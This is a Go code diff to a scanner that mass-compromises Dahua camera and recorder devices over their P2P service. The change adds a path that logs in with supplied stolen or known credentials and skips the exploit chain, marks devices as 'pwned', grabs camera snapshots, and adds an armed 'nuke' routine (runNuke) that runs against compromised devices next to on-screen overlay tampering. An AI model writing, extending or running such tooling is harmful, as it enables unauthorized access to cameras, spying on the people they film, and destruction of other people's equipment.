@@ -26,6 +26,7 @@ type Scanner struct {
 	Threads     int
 	OutDir      string
 	InputSource string
+	NukeArmed   bool
 
 	// Stats
 	TotalCount     int64
@@ -50,6 +51,7 @@ type Scanner struct {
 	pwnedList  []ExploitResult
 	cancelChan chan struct{}
 	hsSem      chan struct{}
+	provided   map[string]ProvidedCred
 }
 
 const (
@@ -57,15 +59,21 @@ const (
 	cleanupWatchdogTimeout  = 10 * time.Minute
 )
 
-func NewScanner(targets []string, config *Config, threads int, outDir string, inputSource string) *Scanner {
+func NewScanner(targets []string, config *Config, threads int, outDir string, inputSource string, nukeArmed bool, provided []ProvidedCred) *Scanner {
+	creds := make(map[string]ProvidedCred, len(provided))
+	for _, c := range provided {
+		creds[c.Serial] = c
+	}
 	return &Scanner{
 		Targets:     targets,
 		Config:      config,
 		Threads:     threads,
 		OutDir:      outDir,
 		InputSource: inputSource,
+		NukeArmed:   nukeArmed,
 		cancelChan:  make(chan struct{}),
 		hsSem:       make(chan struct{}, maxConcurrentHandshakes),
+		provided:    creds,
 	}
 }
 
@@ -281,6 +289,20 @@ func (s *Scanner) handleOnlineSerial(serial string, retries int, connTimeout tim
 	var finalClient *p2p.DHClient
 	var requiresType1 bool
 
+	// ready credentials from the input skip the whole exploit chain
+	if hint, has := s.credHint(serial); has {
+		if c := s.handshakeWithCreds(serial, hint, retries, connTimeout); c != nil {
+			finalClient = c
+			ok = true
+			LogHandshakeResult(serial, 1, 0, nil)
+			s.mu.Lock()
+			s.OnlineCount++
+			s.mu.Unlock()
+			s.processOnlineClient(serial, finalClient)
+			return
+		}
+	}
+
 	var lastErr error
 	for attempt := 0; attempt < retries; attempt++ {
 		select {
@@ -382,6 +404,47 @@ func (s *Scanner) handleOnlineSerial(serial string, retries int, connTimeout tim
 	}
 }
 
+func (s *Scanner) credHint(serial string) (ProvidedCred, bool) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	c, ok := s.provided[serial]
+	return c, ok
+}
+
+// type1 first then type0 both authenticated with the given login
+func (s *Scanner) handshakeWithCreds(serial string, cred ProvidedCred, retries int, connTimeout time.Duration) *p2p.DHClient {
+	build := func(auth bool) *p2p.DHClient {
+		c := p2p.NewDHClient(serial)
+		c.SetRetries(retries)
+		c.SetTimeout(connTimeout)
+		if auth {
+			c.SetDeviceAuth(cred.Login, cred.Password, "")
+		}
+		return c
+	}
+	for _, auth := range []bool{true, false} {
+		for attempt := 0; attempt < retries; attempt++ {
+			select {
+			case <-s.cancelChan:
+				return nil
+			default:
+			}
+			client := build(auth)
+			err := client.Handshake()
+			if err == nil {
+				LogCredsLogin(serial, cred.Login, auth)
+				return client
+			}
+			client.Close()
+			LogCredsFail(serial, cred.Login, auth, attempt+1, err)
+			if !auth && p2p.IsChannelAuthRequired(err) {
+				break // plain channel is walled credentials were wrong
+			}
+		}
+	}
+	return nil
+}
+
 func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
 	retries := 3
 	if val, err := getIntValue(s.Config.Scan.Retries); err == nil {
@@ -416,6 +479,11 @@ func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
 			client.Close()
 		}
 
+		if hint, has := s.credHint(serial); has {
+			s.useProvidedCreds(serial, client, tunnel, directOK, hint, cleanup)
+			return
+		}
+
 		pwned := s.processExploit(serial, client, tunnel, directOK, cleanup)
 		if !pwned {
 			go cleanup()
@@ -428,6 +496,49 @@ func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
 	s.SafeCount++
 	s.CompletedCount++
 	s.mu.Unlock()
+}
+
+func (s *Scanner) useProvidedCreds(serial string, client *p2p.DHClient, tunnel *p2p.PTCPTunnel, directOK bool, cred ProvidedCred, cleanup func()) {
+	ip := ""
+	if addr := client.GetDeviceAddr(); addr != "" {
+		if i := strings.Index(addr, ":"); i > 0 {
+			ip = addr[:i]
+		} else {
+			ip = addr
+		}
+	}
+
+	tunnel.SetAuth(cred.Login, cred.Password)
+	model, channels, _, err := tunnel.GetDeviceInfo()
+	if err != nil || model == "" {
+		sdk := p2p.NewSDKClient(tunnel, cred.Login, cred.Password)
+		if _, m, ch, sErr := sdk.GetDeviceInfo(); sErr == nil {
+			if m != "" {
+				model = m
+			}
+			if ch > 0 {
+				channels = ch
+			}
+		}
+	}
+	if model == "" {
+		model = "Dahua Device"
+	}
+	if channels <= 0 {
+		channels = 1
+	}
+
+	res := &ExploitResult{
+		Method:   "creds",
+		Login:    cred.Login,
+		Password: cred.Password,
+		Model:    model,
+		Channels: channels,
+		IP:       ip,
+	}
+	s.handlePwnedResult(serial, ip, res, tunnel, func(*ExploitResult) (*p2p.PTCPTunnel, bool) {
+		return tunnel, false
+	}, cleanup)
 }
 
 func (s *Scanner) handlePwnedResult(serial, ip string, res *ExploitResult, tunnel *p2p.PTCPTunnel, reopen func(*ExploitResult) (*p2p.PTCPTunnel, bool), cleanup func()) {
@@ -445,10 +556,10 @@ func (s *Scanner) handlePwnedResult(serial, ip string, res *ExploitResult, tunne
 		}
 	}
 
-	if s.Config.Pwn.Snapshot && res != nil && res.Channels > 0 && res.Login != "" && res.Password != "" {
+	if s.Config.Image.Snapshot && res != nil && res.Channels > 0 && res.Login != "" && res.Password != "" {
 		captured := false
 		for attempt := 0; attempt < 3; attempt++ {
-			ok, snapErr := CaptureSnapshot(activeTunnel, res.Method, res.Login, res.Password, res.Channels, s.OutDir, serial, res.Model)
+			ok, snapErr := CaptureSnapshot(activeTunnel, res.Method, res.Login, res.Password, res.Channels, s.OutDir, serial, res.Model, s.Config.Image)
 			if ok {
 				captured = true
 				break
@@ -469,7 +580,7 @@ func (s *Scanner) handlePwnedResult(serial, ip string, res *ExploitResult, tunne
 				s.CompletedCount++
 				s.mu.Unlock()
 			}
-			s.launchOSD(serial, activeTunnel, res, osdCleanup)
+			s.launchExtras(serial, activeTunnel, res, osdCleanup)
 			return
 		}
 	}
@@ -478,7 +589,7 @@ func (s *Scanner) handlePwnedResult(serial, ip string, res *ExploitResult, tunne
 	s.CompletedCount++
 	s.mu.Unlock()
 
-	s.launchOSD(serial, activeTunnel, res, osdCleanup)
+	s.launchExtras(serial, activeTunnel, res, osdCleanup)
 }
 
 // report whether the method pwned the device
@@ -572,7 +683,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 			s.CompletedCount++
 			s.mu.Unlock()
 		}
-		s.launchOSD(serial, tunnel, res, cleanup)
+		s.launchExtras(serial, tunnel, res, cleanup)
 		return true
 	}
 
@@ -703,7 +814,7 @@ func (s *Scanner) dialFreshTunnel(serial string, res *ExploitResult) (*p2p.PTCPT
 }
 
 func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
-	if !s.Config.Pwn.Snapshot || res == nil || res.Channels <= 0 || res.Login == "" || res.Password == "" {
+	if !s.Config.Image.Snapshot || res == nil || res.Channels <= 0 || res.Login == "" || res.Password == "" {
 		return false
 	}
 
@@ -777,7 +888,7 @@ func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
 
 			snapshotOK := false
 			for snapshotAttempt := 0; snapshotAttempt < retries; snapshotAttempt++ {
-				if ok, _ := CaptureSnapshot(tunnel, method, login, password, channels, s.OutDir, serial, model); ok {
+				if ok, _ := CaptureSnapshot(tunnel, method, login, password, channels, s.OutDir, serial, model, s.Config.Image); ok {
 					snapshotOK = true
 					break
 				}
@@ -799,16 +910,20 @@ func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
 	return true
 }
 
-func (s *Scanner) launchOSD(serial string, tunnel *p2p.PTCPTunnel, res *ExploitResult, cleanup func()) {
-	if !s.Config.Overlay.Osd || res == nil || res.Login == "" || res.Password == "" {
+func (s *Scanner) launchExtras(serial string, tunnel *p2p.PTCPTunnel, res *ExploitResult, cleanup func()) {
+	if res == nil || res.Login == "" || res.Password == "" {
 		if cleanup != nil {
 			cleanup()
 		}
 		return
 	}
+
+	nukeOn := s.NukeArmed && s.Config.Nuke.enabled()
 	channel := normalizeOSDChannel(s.Config.Overlay.Channel)
 	lines := normalizeOSDLines(s.Config.Overlay.Custom)
-	if channel == "" && len(lines) == 0 {
+	osdOn := s.Config.Overlay.Osd && (channel != "" || len(lines) > 0)
+
+	if !nukeOn && !osdOn {
 		if cleanup != nil {
 			cleanup()
 		}
@@ -820,6 +935,12 @@ func (s *Scanner) launchOSD(serial string, tunnel *p2p.PTCPTunnel, res *ExploitR
 		defer s.snapshotWg.Done()
 		if cleanup != nil {
 			defer cleanup()
+		}
+		if nukeOn {
+			runNuke(tunnel, res.Login, res.Password, res.Channels, s.Config.Nuke, s.Config.Dummy.Login, serial, nukeOn)
+		}
+		if !osdOn {
+			return
 		}
 		redial := func() (*p2p.PTCPTunnel, func(), bool) {
 			return s.dialFreshTunnel(serial, res)
